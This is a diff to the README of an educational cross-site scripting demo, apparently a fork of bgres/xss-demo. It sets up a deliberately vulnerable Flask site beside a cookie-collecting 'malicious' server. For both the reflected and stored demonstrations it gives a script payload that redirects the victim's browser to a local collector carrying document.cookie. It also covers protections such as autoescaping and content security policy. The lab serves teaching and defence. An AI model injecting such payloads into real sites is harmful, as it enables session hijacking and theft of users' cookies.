@@ -14,22 +14,25 @@ This is meant for educational purposed only, please do not use it to attack webs
 * Clone this repository.
 * Create a [virtual environment](https://virtualenvwrapper.readthedocs.io/) (if you don't want to install `flask` in your global python environment) and 
   activate it.
-* `pip install flask`
-* Run `FLASK_ENV=development flask run` in the vulnerable website folder
-* Run `python app.py` in the malicious website folder
-* Open [127.0.0.1:5000](http://127.0.0.1:5000/) in your webbrowser.
-* Go to [127.0.0.1:5000](http://127.0.0.1:5000/cookie) to create set a cookie
-* Go to [127.0.0.1:5000](http://127.0.0.1:5000/) and have fun with XSS
+* `pip install flask` to install flask in the virtual environment
+* Run `flask run` in the vulnerable website folder
+* Open [127.0.0.1:5000](http://127.0.0.1:5000/) in your webbrowser and have fun with XSS
 
 As you started the flask app in development mode, any source changes should apply immediately so you can just refresh
 the page. If you want to clear the database, just delete the `database.db` file that is (re-)created on first use.
 
-# Demostration for reflected XSS
+
+# Demostrations of XSS
+## Things to note BEFORE trying the demostration
+* Go to [127.0.0.1:5000/cookie](http://127.0.0.1:5000/cookie) to create set a cookie for the main website
+* Run `python app.py` in the malicious website folder to run the malicious server to collect the cookies
+
+## Demostration for reflected XSS
 * Key in `<script type='text/javascript'>document.location='http://127.0.0.1:1000/?c='+document.cookie;</script>` into the query blank
 * Notice that the code is reflected inside the addressbar as a query.
 * When the user clicks on the link containing the address, their cookies from the vulnerable website can be stolen
 
-# Demostration for Stored XSS
+## Demostration for Stored XSS
 ### WARNING, this will spam ping the server as the page is loading
 * Key in `<script type='text/javascript'>document.location='http://127.0.0.1:1000/?c='+document.cookie;</script>` into the comment blank
 * Notice that the code is stored within the website
@@ -41,7 +44,9 @@ the page. If you want to clear the database, just delete the `database.db` file 
 # Protection mechanisms
 
 Of course you should never deactivate autoescaping in jinja/flask, so you should never have 
-`{% autoescape false %}` in your production templates. This way you will always get the 
+`{% autoescape false %}` in your production templates. 
+<br>
+This way you will always get the 
 [standard HTML context filtering](https://flask.palletsprojects.com/en/1.1.x/templating/#controlling-autoescaping)
 for variables in your templates.
 
@@ -69,4 +74,5 @@ disallow unsafe inline javascript by replacing
 # Acknowledgements
 
 This was forked from [bgres/xss-demo](https://github.com/bgres/xss-demo) 
+<br>
 The reflected server is made using a simple flask script
